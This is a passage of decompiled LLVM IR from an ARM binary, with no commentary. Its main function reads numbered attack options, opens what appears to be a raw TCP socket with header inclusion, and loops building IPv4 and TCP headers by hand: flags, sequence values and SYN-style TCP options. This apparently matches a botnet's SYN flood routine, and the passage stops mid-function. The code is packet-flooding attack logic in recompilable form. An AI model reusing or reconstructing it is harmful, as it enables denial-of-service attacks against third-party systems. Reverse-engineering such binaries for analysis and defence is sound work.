  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aef0, { 1, 0 }
  uselistorder label %dec_label_pc_aed8, { 1, 0 }
  uselistorder label %dec_label_pc_ad60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_acdc, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_af1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_af1c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af1c = load i32, i32* @r4, align 4
  %v24_af1c = load i32, i32* @fp, align 4
  %v27_af1c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af38 = call i32 @function_1214c(i32 %arg1, i32 4)
  %v0_af3c = load i32, i32* @r5, align 4
  store i32 %v0_af3c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af38, i32* @sb, align 4
  %v0_af4c = load i32, i32* @r4, align 4
  store i32 %v0_af4c, i32* %r0.global-to-local, align 4
  %v5_af50 = inttoptr i32 %v0_af3c to i32*
  %v6_af50 = call i32 @function_8570(i32 %v0_af4c, i32* %v5_af50, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_af68 = load i32, i32* @r5, align 4
  store i32 %v0_af68, i32* %r1.global-to-local, align 4
  %v0_af6c = load i32, i32* @r4, align 4
  store i32 %v0_af6c, i32* %r0.global-to-local, align 4
  %v5_af70 = trunc i32 %v6_af50 to i8
  %v6_af74 = inttoptr i32 %v0_af68 to i32*
  %v7_af74 = call i32 @function_8570(i32 %v0_af6c, i32* %v6_af74, i32 3, i32 65535, i32 %v6_af50)
  %v0_af78 = load i32, i32* @r5, align 4
  store i32 %v0_af78, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_af88 = load i32, i32* @r4, align 4
  store i32 %v0_af88, i32* %r0.global-to-local, align 4
  %v5_af8c = inttoptr i32 %v0_af78 to i32*
  %v6_af8c = call i32 @function_8570(i32 %v0_af88, i32* %v5_af8c, i32 4, i32 64, i32 %v7_af74)
  %v1_af94 = urem i32 %v6_af8c, 256
  %v0_af98 = load i32, i32* @r5, align 4
  store i32 %v0_af98, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afa4 = load i32, i32* @r4, align 4
  store i32 %v0_afa4, i32* %r0.global-to-local, align 4
  %v6_afac = inttoptr i32 %v0_af98 to i32*
  %v7_afac = call i32 @function_8570(i32 %v0_afa4, i32* %v6_afac, i32 5, i32 1, i32 %v1_af94)
  %v1_afb8 = urem i32 %v7_afac, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_afc4 = load i32, i32* @r5, align 4
  store i32 %v0_afc4, i32* %r1.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afd0 = inttoptr i32 %v0_afc4 to i32*
  %v6_afd0 = call i32 @function_8570(i32 %v0_afc8, i32* %v5_afd0, i32 6, i32 65535, i32 %v1_afb8)
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_afd0, i32* %fp.global-to-local, align 4
  %v0_afe8 = load i32, i32* @r4, align 4
  store i32 %v0_afe8, i32* %r0.global-to-local, align 4
  %v5_afec = inttoptr i32 %v0_afd8 to i32*
  %v6_afec = call i32 @function_8570(i32 %v0_afe8, i32* %v5_afec, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_aff4 = load i32, i32* @r5, align 4
  store i32 %v0_aff4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_afec, i32* @r6, align 4
  %v0_b004 = load i32, i32* @r4, align 4
  store i32 %v0_b004, i32* %r0.global-to-local, align 4
  %v5_b008 = inttoptr i32 %v0_aff4 to i32*
  %v6_b008 = call i32 @function_8570(i32 %v0_b004, i32* %v5_b008, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b00c = load i32, i32* @r5, align 4
  store i32 %v0_b00c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b01c = load i32, i32* @r4, align 4
  store i32 %v0_b01c, i32* %r0.global-to-local, align 4
  %v5_b020 = inttoptr i32 %v0_b00c to i32*
  %v6_b020 = call i32 @function_8570(i32 %v0_b01c, i32* %v5_b020, i32 18, i32 0, i32 %v6_b008)
  %v0_b024 = load i32, i32* @r5, align 4
  store i32 %v0_b024, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b034 = load i32, i32* @r4, align 4
  store i32 %v0_b034, i32* %r0.global-to-local, align 4
  %v5_b038 = inttoptr i32 %v0_b024 to i32*
  %v6_b038 = call i32 @function_8570(i32 %v0_b034, i32* %v5_b038, i32 11, i32 0, i32 %v6_b020)
  %v0_b03c = load i32, i32* @r5, align 4
  store i32 %v0_b03c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b04c = load i32, i32* @r4, align 4
  store i32 %v0_b04c, i32* %r0.global-to-local, align 4
  %v5_b050 = inttoptr i32 %v0_b03c to i32*
  %v6_b050 = call i32 @function_8570(i32 %v0_b04c, i32* %v5_b050, i32 12, i32 0, i32 %v6_b038)
  %v0_b054 = load i32, i32* @r5, align 4
  store i32 %v0_b054, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b064 = load i32, i32* @r4, align 4
  store i32 %v0_b064, i32* %r0.global-to-local, align 4
  %v5_b068 = inttoptr i32 %v0_b054 to i32*
  %v6_b068 = call i32 @function_8570(i32 %v0_b064, i32* %v5_b068, i32 13, i32 0, i32 %v6_b050)
  %v0_b06c = load i32, i32* @r5, align 4
  store i32 %v0_b06c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b07c = load i32, i32* @r4, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  %v5_b080 = inttoptr i32 %v0_b06c to i32*
  %v6_b080 = call i32 @function_8570(i32 %v0_b07c, i32* %v5_b080, i32 14, i32 0, i32 %v6_b068)
  %v0_b084 = load i32, i32* @r5, align 4
  store i32 %v0_b084, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b094 = load i32, i32* @r4, align 4
  store i32 %v0_b094, i32* %r0.global-to-local, align 4
  %v5_b098 = inttoptr i32 %v0_b084 to i32*
  %v6_b098 = call i32 @function_8570(i32 %v0_b094, i32* %v5_b098, i32 15, i32 1, i32 %v6_b080)
  %v0_b09c = load i32, i32* @r5, align 4
  store i32 %v0_b09c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ac = load i32, i32* @r4, align 4
  store i32 %v0_b0ac, i32* %r0.global-to-local, align 4
  %v5_b0b0 = inttoptr i32 %v0_b09c to i32*
  %v6_b0b0 = call i32 @function_8570(i32 %v0_b0ac, i32* %v5_b0b0, i32 16, i32 0, i32 %v6_b098)
  %v2_b0bc = load i32, i32* @global_var_20a4c.46, align 4
  store i32 %v2_b0bc, i32* %r3.global-to-local, align 4
  %v0_b0c0 = load i32, i32* @r5, align 4
  store i32 %v0_b0c0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b0c8 = load i32, i32* @r4, align 4
  store i32 %v0_b0c8, i32* %r0.global-to-local, align 4
  %v5_b0cc = inttoptr i32 %v0_b0c0 to i32*
  %v6_b0cc = call i32 @function_8504(i32 %v0_b0c8, i32* %v5_b0cc, i32 25, i32 %v2_b0bc, i32 %v6_b0b0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b0e0 = call i32 @function_115e4(i32 2, i32 3, i32 6)
  store i32 %v3_b0e0, i32* %r0.global-to-local, align 4
  %v7_b0e4 = icmp eq i32 %v3_b0e0, -1
  store i1 %v7_b0e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b0e0, i32* @sl, align 4
  br i1 %v7_b0e4, label %dec_label_pc_b5b8, label %dec_label_pc_b0f0

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_af1c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b0f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b0f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b10c = call i32 @function_115a0(i32 %v3_b0e0, i32 0, i32 3, i32 %v6_b0f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b10c, i32* %r0.global-to-local, align 4
  %v7_b110 = icmp eq i32 %v5_b10c, -1
  store i1 %v7_b110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b110, label %dec_label_pc_b5b0, label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b0f0
  %v3_b120 = mul i32 %v7_af74, 65536
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v0_b124 = load i32, i32* %fp.global-to-local, align 4
  %v3_b124 = mul i32 %v0_b124, 65536
  store i32 %v3_b124, i32* %r4.global-to-local, align 4
  %v0_b128 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b038, i32* %r2.global-to-local, align 4
  %v3_b134 = urem i32 %v7_af74, 65536
  store i32 %v3_b134, i32* %r3.global-to-local, align 4
  %v3_b138 = urem i32 %v0_b124, 65536
  %v3_b13c = urem i32 %v0_b128, 65536
  store i32 %v3_b13c, i32* %r1.global-to-local, align 4
  %v0_b140 = load i32, i32* @r7, align 4
  %v2_b140 = icmp eq i32 %v0_b140, 0
  store i1 %v2_b140, i1* %cpsr_z.global-to-local, align 1
  %v1_b150 = urem i32 %v6_b038, 256
  store i32 %v1_b150, i32* @fp, align 4
  br i1 %v2_b140, label %dec_label_pc_b3a4.preheader, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b118
  %tmp52 = mul i32 %v6_b008, 256
  %v3_b170 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_af74, 256
  %v3_b174 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b008, 256
  %v4_b17c = urem i32 %tmp54, 256
  %v5_b17c = or i32 %v4_b17c, %v3_b170
  store i32 %v5_b17c, i32* @lr, align 4
  %v1_b178 = mul i32 %v7_af74, 256
  %v4_b180 = and i32 %v1_b178, 65280
  %v5_b180 = or i32 %v4_b180, %v3_b174
  %tmp55 = mul i32 %v0_b124, 256
  %v3_b18c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b128, 256
  %v3_b190 = and i32 %tmp56, 65280
  %v1_b194 = urem i32 %v6_b038, 2
  %v1_b198 = urem i32 %v6_b050, 2
  %tmp57 = udiv i32 %v0_b124, 256
  %v4_b19c = urem i32 %tmp57, 256
  %v5_b19c = or i32 %v4_b19c, %v3_b18c
  store i32 %v5_b19c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b128, 256
  %v4_b1a0 = urem i32 %tmp58, 256
  %v5_b1a0 = or i32 %v4_b1a0, %v3_b190
  store i32 %v5_b1a0, i32* @r5, align 4
  %v1_b1bc = urem i32 %v6_b068, 2
  store i32 %v1_b1bc, i32* %r2.global-to-local, align 4
  %v1_b1c0 = urem i32 %v6_b080, 2
  store i32 %v1_b1c0, i32* %r3.global-to-local, align 4
  %v1_b1c4 = urem i32 %v6_b098, 2
  store i32 %v1_b1c4, i32* %r0.global-to-local, align 4
  %v1_b1c8 = urem i32 %v6_b0b0, 2
  store i32 %v1_b1c8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b180, 65536
  %v4_b250 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b198
  %v4_b2b4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1bc
  %v4_b2c8 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b1c0
  %v4_b2e0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b1c4
  %v3_b2f4 = and i32 %tmp64, 2
  %v1_b244 = trunc i32 %v6_af8c to i8
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %bb61, %dec_label_pc_b158
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b1f0 = call i32 @function_1214c(i32 128, i32 1)
  store i32 %v2_b1f0, i32* %r0.global-to-local, align 4
  %v3_b1f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b1f4, i32* %r2.global-to-local, align 4
  %v1_b1f8 = load i32, i32* @sb, align 4
  %v2_b1f8 = load i32, i32* @r4, align 4
  %v5_b1f8 = mul i32 %v2_b1f8, 4
  %v6_b1f8 = add i32 %v5_b1f8, %v1_b1f8
  %v7_b1f8 = inttoptr i32 %v6_b1f8 to i32*
  store i32 %v2_b1f0, i32* %v7_b1f8, align 4
  %v0_b1fc = load i32, i32* %r2.global-to-local, align 4
  %v3_b1fc = mul i32 %v0_b1fc, 32
  store i32 %v3_b1fc, i32* %r3.global-to-local, align 4
  %v0_b200 = load i32, i32* @sb, align 4
  %v4_b200 = mul i32 %v0_b1fc, 4
  %v5_b200 = add i32 %v0_b200, %v4_b200
  %v6_b200 = inttoptr i32 %v5_b200 to i32*
  %v7_b200 = load i32, i32* %v6_b200, align 4
  store i32 %v7_b200, i32* %r4.global-to-local, align 4
  %v5_b204 = mul i32 %v0_b1fc, 24
  store i32 %v5_b204, i32* %r3.global-to-local, align 4
  %v1_b208 = load i32, i32* @r8, align 4
  %v2_b208 = add i32 %v1_b208, %v5_b204
  store i32 %v2_b208, i32* %r0.global-to-local, align 4
  %v1_b20c = inttoptr i32 %v7_b200 to i8*
  %v2_b20c = load i8, i8* %v1_b20c, align 1
  %tmp65 = urem i8 %v2_b20c, 16
  %v1_b210 = zext i8 %tmp65 to i32
  %v1_b214 = or i32 %v1_b210, 64
  store i32 %v1_b214, i32* %r3.global-to-local, align 4
  %v1_b218 = trunc i32 %v1_b214 to i8
  store i8 %v1_b218, i8* %v1_b20c, align 1
  %v0_b21c = load i32, i32* %r4.global-to-local, align 4
  %v1_b21c = inttoptr i32 %v0_b21c to i8*
  %v2_b21c = load i8, i8* %v1_b21c, align 1
  %v1_b220 = and i8 %v2_b21c, -16
  %v1_b224 = or i8 %v1_b220, 5
  store i32 %v1_afb8, i32* %r3.global-to-local, align 4
  store i8 %v1_b224, i8* %v1_b21c, align 1
  %v2_b234 = load i32, i32* %r4.global-to-local, align 4
  %v3_b234 = add i32 %v2_b234, 1
  %v4_b234 = inttoptr i32 %v3_b234 to i8*
  store i8 %v5_af70, i8* %v4_b234, align 1
  store i32 %v1_af94, i32* %r2.global-to-local, align 4
  %v0_b23c = load i32, i32* %r3.global-to-local, align 4
  %v2_b23c = icmp eq i32 %v0_b23c, 0
  store i1 %v2_b23c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b244 = load i32, i32* %r4.global-to-local, align 4
  %v3_b244 = add i32 %v2_b244, 8
  %v4_b244 = inttoptr i32 %v3_b244 to i8*
  store i8 %v1_b244, i8* %v4_b244, align 1
  %v0_b248 = load i32, i32* %r3.global-to-local, align 4
  %v1_b248 = trunc i32 %v0_b248 to i16
  %v2_b248 = load i32, i32* %r4.global-to-local, align 4
  %v3_b248 = add i32 %v2_b248, 2
  %v4_b248 = inttoptr i32 %v3_b248 to i16*
  store i16 %v1_b248, i16* %v4_b248, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b250, i32* %r1.global-to-local, align 4
  %v0_b254 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b254, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b1e8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b1e8, %bb
  %v2_b258 = load i32, i32* %r4.global-to-local, align 4
  %v3_b258 = add i32 %v2_b258, 9
  %v4_b258 = inttoptr i32 %v3_b258 to i8*
  store i8 6, i8* %v4_b258, align 1
  %v0_b25c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b25c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b25c = load i32, i32* %r2.global-to-local, align 4
  %v2_b25c = trunc i32 %v1_b25c to i16
  %v3_b25c = load i32, i32* %r4.global-to-local, align 4
  %v4_b25c = add i32 %v3_b25c, 6
  %v5_b25c = inttoptr i32 %v4_b25c to i16*
  store i16 %v2_b25c, i16* %v5_b25c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b0cc, i32* %r2.global-to-local, align 4
  %v1_b264 = load i32, i32* %r4.global-to-local, align 4
  %v2_b264 = add i32 %v1_b264, 12
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v6_b0cc, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r0.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 16
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  store i32 %v3_b268, i32* %r3.global-to-local, align 4
  %v0_b26c = load i32, i32* %r1.global-to-local, align 4
  %v1_b26c = trunc i32 %v0_b26c to i16
  %v2_b26c = load i32, i32* %r4.global-to-local, align 4
  %v3_b26c = add i32 %v2_b26c, 4
  %v4_b26c = inttoptr i32 %v3_b26c to i16*
  store i16 %v1_b26c, i16* %v4_b26c, align 2
  %v0_b270 = load i32, i32* %r3.global-to-local, align 4
  %v1_b270 = load i32, i32* %r4.global-to-local, align 4
  %v2_b270 = add i32 %v1_b270, 16
  %v3_b270 = inttoptr i32 %v2_b270 to i32*
  store i32 %v0_b270, i32* %v3_b270, align 4
  %v0_b274 = load i32, i32* @r6, align 4
  %v1_b274 = trunc i32 %v0_b274 to i16
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 20
  %v4_b274 = inttoptr i32 %v3_b274 to i16*
  store i16 %v1_b274, i16* %v4_b274, align 2
  %v0_b278 = load i32, i32* %r4.global-to-local, align 4
  %v1_b278 = add i32 %v0_b278, 20
  store i32 %v1_b278, i32* %r1.global-to-local, align 4
  %v1_b27c = add i32 %v0_b278, 32
  %v2_b27c = inttoptr i32 %v1_b27c to i8*
  %v3_b27c = load i8, i8* %v2_b27c, align 1
  %v4_b27c = zext i8 %v3_b27c to i32
  store i32 %v4_b27c, i32* %r3.global-to-local, align 4
  %v1_b280 = add i32 %v0_b278, 33
  %v2_b280 = inttoptr i32 %v1_b280 to i8*
  %v3_b280 = load i8, i8* %v2_b280, align 1
  %v4_b280 = zext i8 %v3_b280 to i32
  store i32 %v1_b194, i32* %r0.global-to-local, align 4
  %v1_b288 = urem i8 %v3_b27c, 16
  %v1_b28c = or i8 %v1_b288, -96
  %v1_b290 = and i32 %v4_b280, 223
  store i32 %v1_b290, i32* %r2.global-to-local, align 4
  store i8 %v1_b28c, i8* %v2_b27c, align 1
  %v0_b298 = load i32, i32* %r2.global-to-local, align 4
  %v1_b298 = load i32, i32* %r0.global-to-local, align 4
  %v4_b298 = mul i32 %v1_b298, 32
  %v5_b298 = or i32 %v4_b298, %v0_b298
  store i32 %v5_b298, i32* %r2.global-to-local, align 4
  store i32 %v5_b17c, i32* %r3.global-to-local, align 4
  %v1_b2a0 = trunc i32 %v5_b298 to i8
  %v2_b2a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2a0 = add i32 %v2_b2a0, 13
  %v4_b2a0 = inttoptr i32 %v3_b2a0 to i8*
  store i8 %v1_b2a0, i8* %v4_b2a0, align 1
  %v0_b2a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 4
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v0_b2a4, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 13
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i8*
  %v3_b2a8 = load i8, i8* %v2_b2a8, align 1
  %v4_b2a8 = zext i8 %v3_b2a8 to i32
  store i32 %v1_b198, i32* %r0.global-to-local, align 4
  %v1_b2b0 = and i32 %v4_b2a8, 239
  %v5_b2b4 = or i32 %v1_b2b0, %v4_b2b4
  store i32 %v5_b2b4, i32* %r3.global-to-local, align 4
  %v1_b2b8 = trunc i32 %v5_b2b4 to i8
  store i8 %v1_b2b8, i8* %v2_b2a8, align 1
  %v0_b2bc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2bc, 13
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v1_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2c4 = and i32 %v4_b2bc, 247
  %v5_b2c8 = or i32 %v1_b2c4, %v4_b2c8
  store i32 %v5_b2c8, i32* %r2.global-to-local, align 4
  %v0_b2cc = load i32, i32* @r5, align 4
  %v1_b2cc = trunc i32 %v0_b2cc to i16
  %v3_b2cc = add i32 %v0_b2bc, 2
  %v4_b2cc = inttoptr i32 %v3_b2cc to i16*
  store i16 %v1_b2cc, i16* %v4_b2cc, align 2
  %v0_b2d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d0 = trunc i32 %v0_b2d0 to i8
  %v2_b2d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2d0 = add i32 %v2_b2d0, 13
  %v4_b2d0 = inttoptr i32 %v3_b2d0 to i8*
  store i8 %v1_b2d0, i8* %v4_b2d0, align 1
  %v0_b2d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2d4 = add i32 %v0_b2d4, 13
  %v2_b2d4 = inttoptr i32 %v1_b2d4 to i8*
  %v3_b2d4 = load i8, i8* %v2_b2d4, align 1
  %v4_b2d4 = zext i8 %v3_b2d4 to i32
  store i32 %v1_b1c0, i32* %r0.global-to-local, align 4
  %v1_b2dc = and i32 %v4_b2d4, 251
  %v5_b2e0 = or i32 %v1_b2dc, %v4_b2e0
  store i32 %v5_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = trunc i32 %v5_b2e0 to i8
  store i8 %v1_b2e4, i8* %v2_b2d4, align 1
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1c4, i32* %r3.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 253
  %v4_b2f4 = or i32 %v1_b2f0, %v3_b2f4
  store i32 %v4_b2f4, i32* %r2.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v4_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1c8, i32* %r0.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 254
  %v2_b308 = or i32 %v1_b304, %v1_b1c8
  store i32 %v2_b308, i32* %r3.global-to-local, align 4
  %v1_b30c = trunc i32 %v2_b308 to i8
  store i8 %v1_b30c, i8* %v2_b2fc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b318 = load i32, i32* %r4.global-to-local, align 4
  %v3_b318 = add i32 %v2_b318, 40
  %v4_b318 = inttoptr i32 %v3_b318 to i8*
  store i8 2, i8* %v4_b318, align 1
  %v0_b31c = load i32, i32* %r2.global-to-local, align 4
  %v1_b31c = trunc i32 %v0_b31c to i8
  %v2_b31c = load i32, i32* %r4.global-to-local, align 4
  %v3_b31c = add i32 %v2_b31c, 41
  %v4_b31c = inttoptr i32 %v3_b31c to i8*
  store i8 %v1_b31c, i8* %v4_b31c, align 1
  %v0_b320 = call i32 @function_e0b4()
  %v1_b324 = urem i32 %v0_b320, 16
  %v1_b328 = or i32 %v1_b324, 1392
  %tmp66 = mul nuw nsw i32 %v1_b328, 256
  %v3_b334 = add nuw nsw i32 %tmp66, 2048
  %v5_b33c = or i32 %v3_b334, 5
  %v1_b340 = trunc i32 %v5_b33c to i16
  %v2_b340 = load i32, i32* %r4.global-to-local, align 4
  %v3_b340 = add i32 %v2_b340, 42
  %v4_b340 = inttoptr i32 %v3_b340 to i16*
  store i16 %v1_b340, i16* %v4_b340, align 2
  %v2_b348 = load i32, i32* %r4.global-to-local, align 4
  %v3_b348 = add i32 %v2_b348, 44
  %v4_b348 = inttoptr i32 %v3_b348 to i8*
  store i8 4, i8* %v4_b348, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 46
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 8, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 47
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = load i32, i32* %r0.global-to-local, align 4
  %v1_b360 = trunc i32 %v0_b360 to i8
  %v2_b360 = load i32, i32* %r4.global-to-local, align 4
  %v3_b360 = add i32 %v2_b360, 45
  %v4_b360 = inttoptr i32 %v3_b360 to i8*
  store i8 %v1_b360, i8* %v4_b360, align 1
  %v0_b364 = call i32 @function_e0b4()
  store i32 %v0_b364, i32* %r0.global-to-local, align 4
  %v2_b36c = load i32, i32* %r4.global-to-local, align 4
  %v3_b36c = add i32 %v2_b36c, 59
  %v4_b36c = inttoptr i32 %v3_b36c to i8*
  store i8 6, i8* %v4_b36c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b37c = load i32, i32* %r4.global-to-local, align 4
  %v2_b37c = add i32 %v1_b37c, 48
  %v3_b37c = inttoptr i32 %v2_b37c to i32*
  store i32 %v0_b364, i32* %v3_b37c, align 4
  %v0_b380 = load i32, i32* %r3.global-to-local, align 4
  %v1_b380 = load i32, i32* %r4.global-to-local, align 4
  %v2_b380 = add i32 %v1_b380, 52
  %v3_b380 = inttoptr i32 %v2_b380 to i32*
  store i32 %v0_b380, i32* %v3_b380, align 4
  %v0_b384 = load i32, i32* %r2.global-to-local, align 4
  %v1_b384 = trunc i32 %v0_b384 to i8
  %v2_b384 = load i32, i32* %r4.global-to-local, align 4
  %v3_b384 = add i32 %v2_b384, 56
  %v4_b384 = inttoptr i32 %v3_b384 to i8*
  store i8 %v1_b384, i8* %v4_b384, align 1
  %v0_b388 = load i32, i32* %r1.global-to-local, align 4
  %v1_b388 = trunc i32 %v0_b388 to i8
  %v2_b388 = load i32, i32* %r4.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 58
